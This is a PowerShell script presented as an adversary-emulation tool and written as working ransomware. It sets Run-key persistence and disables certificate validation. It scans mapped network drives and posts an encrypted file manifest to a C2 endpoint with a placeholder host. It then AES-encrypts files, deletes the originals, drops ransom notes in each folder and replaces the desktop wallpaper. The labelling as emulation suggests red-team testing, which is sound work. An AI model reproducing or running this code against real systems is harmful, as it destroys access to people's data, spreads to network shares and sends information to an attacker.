<#
.SYNOPSIS
    Apex Pro Adversary Emulation Agent.
.DESCRIPTION
    Comprehensive script to simulate ransomware behavior: Persistence, 
    Network Share Discovery, HTTPS Exfiltration, and forced Wallpaper change.
#>

param(
    [Parameter(Mandatory=$true)]
    [ValidateSet("Encrypt", "Decrypt")]
    $Mode, 

    [string]$TargetPath = "C:\SimulationData", 

    [string]$C2Url = "https://YOUR_C2_IP/api/v1/telemetry",

    [int]$Timer = 60
)

# Place the SSL bypass immediately AFTER the param block
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}

# Shared AES-256 Key (32 bytes)
$Passphrase = "12345678901234567890123456789012"
$KeyBytes = [System.Text.Encoding]::UTF8.GetBytes($Passphrase)

# --- SECTION 1: WALLPAPER HIJACK (T1491) ---
# Defines the C# code needed to interact with the Windows User32 library.
$WP_Code = @'
using System;
using System.Runtime.InteropServices;
public class Wallpaper {
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
    public const int SPI_SETDESKWALLPAPER = 0x0014;
    public const int SPIF_UPDATEINIFILE = 0x01;
    public const int SPIF_SENDWININICHANGE = 0x02;
    public static void Set(string path) {
        SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, path, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
    }
}
'@
Add-Type -TypeDefinition $WP_Code

function Set-ApexWallpaper {
    # Uses .NET Drawing to create a high-visibility ransom message background
    Add-Type -AssemblyName System.Drawing
    $Path = "$env:TEMP\apex_bg.bmp"
    $Bmp = New-Object System.Drawing.Bitmap(1920,1080)
    $G = [System.Drawing.Graphics]::FromImage($Bmp)
    $G.Clear([System.Drawing.Color]::DarkRed) # Classic "Alert" Red
    $Font = New-Object System.Drawing.Font("Impact", 80)
    $G.DrawString("SYSTEM ENCRYPTED", $Font, [System.Drawing.Brushes]::White, 400, 400)
    $G.DrawString("Contact Admin to Recover", (New-Object System.Drawing.Font("Arial", 40)), [System.Drawing.Brushes]::White, 550, 550)
    $Bmp.Save($Path, [System.Drawing.Imaging.ImageFormat]::Bmp)
    $G.Dispose(); $Bmp.Dispose()
    # Apply the wallpaper via the User32 API
    [Wallpaper]::Set($Path)
}

# --- SECTION 2: CRYPTO ENGINE (T1486) ---
# Implements AES-256-CBC with IV prepending for file-level encryption.

function Invoke-ApexCipher {
    param ($Path, $Key, $Action)
    try {
        $Aes = [System.Security.Cryptography.Aes]::Create()
        $Aes.Key = $Key
        if ($Action -eq "Encrypt") {
            $Aes.GenerateIV()
            $Enc = $Aes.CreateEncryptor()
            $In = [System.IO.File]::ReadAllBytes($Path)
            $Out = $Enc.TransformFinalBlock($In, 0, $In.Length)
            # Store IV (16 bytes) at the start of the file for decryption
            [System.IO.File]::WriteAllBytes("$Path.locked", ($Aes.IV + $Out))
            Remove-Item $Path -Force
        } else {
            $In = [System.IO.File]::ReadAllBytes($Path)
            $Aes.IV = $In[0..15]
            $Cipher = $In[16..($In.Length-1)]
            $Dec = $Aes.CreateDecryptor()
            $Plain = $Dec.TransformFinalBlock($Cipher, 0, $Cipher.Length)
            [System.IO.File]::WriteAllBytes($Path.Replace(".locked",""), $Plain)
            Remove-Item $Path -Force
        }
    } catch { Write-Warning "Access Denied: $Path" }
}

# --- SECTION 3: C2 EXFILTRATION (T1041) ---
# Encrypts the victim's file manifest and sends it to the listener over HTTPS.
function Send-ApexExfil {
    param ($DataManifest)
    Write-Host "[*] Exfil Function Triggered. Preparing payload..." -ForegroundColor Cyan
    
    $Json = $DataManifest | ConvertTo-Json
    $Aes = [System.Security.Cryptography.Aes]::Create()
    $Aes.Key = $KeyBytes
    $Aes.GenerateIV()
    $Enc = $Aes.CreateEncryptor()
    $Payload = [System.Text.Encoding]::UTF8.GetBytes($Json)
    $Cipher = $Enc.TransformFinalBlock($Payload, 0, $Payload.Length)
    $B64 = [Convert]::ToBase64String($Aes.IV + $Cipher)
    
    Write-Host "[*] Payload ready. Sending to: $C2Url" -ForegroundColor Cyan
    try {
        # REMOVED -SkipCertificateCheck because PS 5.1 doesn't support it.
        # The line at the top of the script handles the bypass globally.
        $Response = Invoke-RestMethod -Uri $C2Url -Method Post -Body (@{payload=$B64}|ConvertTo-Json) -ContentType "application/json"
        Write-Host "[+] SUCCESS: Server responded with $($Response.status)" -ForegroundColor Green
    } catch {
        Write-Host "[!!!] EXFIL ERROR: $($_.Exception.Message)" -ForegroundColor Red
    }
}

# --- SECTION 4: MAIN EXECUTION ---
if ($Mode -eq "Encrypt") {
    Write-Host "[!] INITIATING IMPACT PHASE..." -ForegroundColor Red
    
    # Trigger Wallpaper Defacement
    Set-ApexWallpaper

    # Persistence: Registry Hijack (T1547.001)
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "ApexUpdate" -Value "powershell.exe -WindowStyle Hidden -File `"$PSCommandPath`" -Mode Encrypt" -Force | Out-Null

    # Lateral Discovery: Scan for Mapped Drives (T1135)
    $Targets = @($TargetPath)
    $Targets += Get-PSDrive -PSProvider FileSystem | Where-Object { $_.DisplayRoot } | Select-Object -ExpandProperty Root

    foreach ($T in $Targets) {
        if (Test-Path $T) {
            $Files = Get-ChildItem $T -Recurse -File -ErrorAction SilentlyContinue | Where-Object {$_.Extension -ne ".locked" -and $_.Name -notlike "*RECOVER*"}
            # Send file list to C2
            Send-ApexExfil -DataManifest ($Files | Select-Object Name, Length)
            # Perform Encryption
            foreach ($F in $Files) { Invoke-ApexCipher -Path $F.FullName -Key $KeyBytes -Action "Encrypt" }
            # Distribute Ransom Notes
            $Dirs = Get-ChildItem $T -Recurse -Directory -ErrorAction SilentlyContinue; $Dirs += Get-Item $T
            foreach ($D in $Dirs) { 
                "<html><body style='background-color:black;color:red;text-align:center;'><h1>!!! CONTACT ADMIN TO RECOVER DATA !!!</h1></body></html>" | Out-File (Join-Path $D.FullName "RECOVER_FILES_NOW.html") -Force 
            }
        }
    }

    # Simulation Timer
    $End = (Get-Date).AddSeconds($Timer)
    while ((Get-Date) -lt $End) {
        Write-Host "`r[!] DATA WIPE IN: $(($End - (Get-Date)).ToString('mm\:ss'))" -NoNewline -ForegroundColor Red
        Start-Sleep 1
    }
} else {
    # Decryption Logic
    Get-ChildItem $TargetPath -Recurse -Filter "*.locked" | ForEach-Object { Invoke-ApexCipher -Path $_.FullName -Key $KeyBytes -Action "Decrypt" }
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "ApexUpdate" -ErrorAction SilentlyContinue
}